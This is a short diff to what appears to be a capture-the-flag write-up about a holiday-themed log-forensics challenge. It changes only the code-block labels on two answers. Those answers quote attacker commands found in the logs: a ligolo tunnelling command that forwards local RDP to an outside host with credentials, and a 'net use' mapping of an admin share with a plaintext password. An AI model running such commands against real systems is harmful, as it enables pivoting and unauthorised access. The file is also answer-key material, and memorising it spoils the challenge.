@@ -101,7 +101,7 @@ ProcessEvents
 
 *Answer for question 1*:   
 This took a little manual analysis, eventually identifying the command:
-```bash
+```cmd
 cmd.exe "ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof
 ```
 
@@ -110,6 +110,6 @@ This took a little manual analysis, eventually identifying a `net share` command
 
 *Answer for question 3*:  
 This took a little manual analysis, eventually identifying the command:
-```bash
+```cmd
 cmd.exe /C net use \\NorthPolefileshare\c$ /user:admin AdminPass123
 ```
